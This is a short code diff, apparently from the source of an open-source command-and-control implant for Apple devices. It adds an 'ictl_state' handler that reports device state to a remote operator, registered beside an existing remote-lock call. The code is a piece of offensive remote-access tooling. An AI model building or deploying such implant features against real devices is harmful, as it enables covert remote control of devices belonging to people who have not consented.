@@ -40,7 +40,14 @@ static c2_api_call_t *ictl_lock(tlv_transport_pkt_t tlv_transport_packet)
     return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, API_CALL_SCSEMPT);
 }
 
+static c2_api_call_t *ictl_state(tlv_transport_pkt_t tlv_transport_packet)
+{
+    NSString *result = ictl_talk([@[@"state"] mutableCopy]);
+    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, [result UTF8String]);
+}
+
 void register_ictl_api_calls(c2_api_calls_t **c2_api_calls_table)
 {
     c2_register_api_call(c2_api_calls_table, 1, ictl_lock, 1);
+    c2_register_api_call(c2_api_calls_table, 2, ictl_state, 1);
 }
